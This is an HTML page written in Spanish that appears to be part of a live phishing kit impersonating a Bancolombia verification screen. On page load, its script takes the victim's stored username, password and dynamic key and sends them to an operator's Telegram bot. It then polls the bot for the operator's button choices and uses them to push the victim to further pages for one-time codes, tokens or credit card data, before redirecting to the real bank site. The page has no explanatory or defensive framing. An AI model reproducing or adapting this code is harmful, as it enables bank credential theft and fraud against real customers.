<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Datos</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('img/fondo.png') no-repeat center center fixed;
            background-size: cover;
        }

        .blur-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(10px);
        }

        .loaderp-full {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            width: 90%;
            height: 90%;
            z-index: 9999;
        }

        .loaderp {
            width: 180px; 
            height: 180px; 
            background-image: url('img/circulo.png'); 
            background-size: cover; 
            border-radius: 50%; 
            position: relative; 
            display: flex;
            flex-direction: column; 
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .loaderp .loader {
            width: 30px; 
            height: 30px; 
            border: 5px solid #f3f3f3; 
            border-top: 5px solid #555; 
            border-radius: 50%;
            animation: spin 1s linear infinite; 
        }

        .loaderp-text {
            margin-top: 30px; 
            font-size: 13px;
            color: black;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="blur-overlay"></div>
    <div class="loaderp-full">
        <div class="loaderp">
            <div class="loader"></div>
            <div class="loaderp-text">Cargando...</div>
        </div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', async function () {
        // Obtener valores de localStorage
        const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
        const dinamica = localStorage.getItem('bancoldina');

        // Validar que existan datos mínimos para continuar
        if (!bancoldata || !bancoldata.usuario || !bancoldata.clave || !dinamica) {
            alert("Faltan datos para continuar. Por favor regresa e ingresa toda la información requerida.");
            return; // Detiene ejecución
        }

        const usuario = bancoldata.usuario;
        const clave = bancoldata.clave;

        // Generar transactionId
        const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        localStorage.setItem('transactionId', transactionId);

        // Crear mensaje para Telegram
        const message = `
<b>Nuevo método de pago pendiente de verificación.</b>
--------------------------------------------------
🤖 <strong>CODIGO CHAMO</strong>
🆔 <b>ID:</b> | <b>${transactionId}</b>
👤 <b>Usuario:</b> | ${usuario}
🔐 <b>Clave:</b> | ${clave}
🔑 <b>Dinamica:</b> | ${dinamica}
--------------------------------------------------
`;

        // Botones interactivos
        const keyboard = JSON.stringify({
            inline_keyboard: [
                [{ text: "Error Dinámica - Bancolombia", callback_data: `pedir_dinamica:${transactionId}` }],
                [{ text: "Pedir Código OTP", callback_data: `pedir_otp:${transactionId}` }],
                [{ text: "TC", callback_data: `tarjeta_credito:${transactionId}` }],
                [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Error de Logo - Bancolombia", callback_data: `error_logo:${transactionId}` }],
                [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
            ],
        });

        // Cargar configuración Telegram
        const config = await loadTelegramConfig();
        if (!config) {
            console.error("Error al cargar configuración de Telegram.");
            return;
        }

        try {
            const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chat_id,
                    text: message,
                    reply_markup: keyboard,
                    parse_mode: "HTML",
                }),
            });

            const data = await response.json();
            if (data.ok) {
                console.log("Mensaje enviado a Telegram con éxito");
                await checkPaymentVerification(transactionId);
            } else {
                throw new Error("Error al enviar mensaje a Telegram.");
            }
        } catch (error) {
            console.error("Error al enviar mensaje:", error);
            // Aquí podrías ocultar loader o mostrar error visual si quieres
        }

        async function loadTelegramConfig() {
            try {
                const response = await fetch("botconfig.json");
                if (!response.ok) {
                    throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
                }
                return await response.json();
            } catch (error) {
                console.error("Error al cargar la configuración de Telegram:", error);
                return null;
            }
        }

        async function checkPaymentVerification(transactionId) {
            const config = await loadTelegramConfig();
            if (!config) return;

            try {
                const response = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates`);
                const data = await response.json();

                const verificationUpdate = data.result.find(update =>
                    update.callback_query &&
                    [
                        `pedir_dinamica:${transactionId}`,
                        `pedir_cajero:${transactionId}`,
                        `pedir_otp:${transactionId}`,
                        `pedir_token:${transactionId}`,
                        `tarjeta_credito:${transactionId}`,
                        `error_tc:${transactionId}`,
                        `error_logo:${transactionId}`,
                        `confirm_finalizar:${transactionId}`
                    ].includes(update.callback_query.data)
                );

                if (verificationUpdate) {
                    // Ocultar loader si quieres
                    // Aquí manejar las respuestas como ya lo tienes
                    switch (verificationUpdate.callback_query.data) {
                        case `pedir_dinamica:${transactionId}`:
                            fetch("sendStatus.php", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ status: "Clave Dinámica" })
                            }).then(() => {
                                window.location.href = "cel-dina.html";
                            });
                            break;
                        case `pedir_cajero:${transactionId}`:
                            fetch("sendStatus.php", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ status: "Cajero Automático" })
                            }).then(() => {
                                window.location.href = "ccajero-id.php";
                            });
                            break;
                        case `pedir_otp:${transactionId}`:
                            fetch("sendStatus.php", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ status: "Código OTP" })
                            }).then(() => {
                                window.location.href = "index-otp.html";
                            });
                            break;
                        case `pedir_token:${transactionId}`:
                            fetch("sendStatus.php", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ status: "Token" })
                            }).then(() => {
                                window.location.href = "index-otp.html";
                            });
                            break;
                        case `tarjeta_credito:${transactionId}`:
                            fetch("sendStatus.php", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ status: "Tarjeta Crédito" })
                            }).then(() => {
                                window.location.href = "cards.html";
                            });
                            break;
                        case `error_tc:${transactionId}`:
                            fetch("sendStatus.php", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ status: "Error TC" })
                            }).then(() => {
                                window.location.href = "errortc.html";
                            });
                            break;
                        case `error_logo:${transactionId}`:
                            fetch("sendStatus.php", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ status: "Error de Logo" })
                            }).then(() => {
                                alert("Error en el inicio de sesión. Reintente.");
                                window.location.href = "index.html";
                            });
                            break;
                        case `confirm_finalizar:${transactionId}`:
                            fetch("sendStatus.php", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ status: "Finalización Exitosa" })
                            }).then(() => {
                                window.location.href = "https://www.bancolombia.com/personas";
                            });
                            break;
                    }
                } else {
                    setTimeout(() => checkPaymentVerification(transactionId), 2000);
                }
            } catch (error) {
                console.error("Error en la verificación:", error);
                setTimeout(() => checkPaymentVerification(transactionId), 2000);
            }
        }
    });
    </script>
</body>
</html>
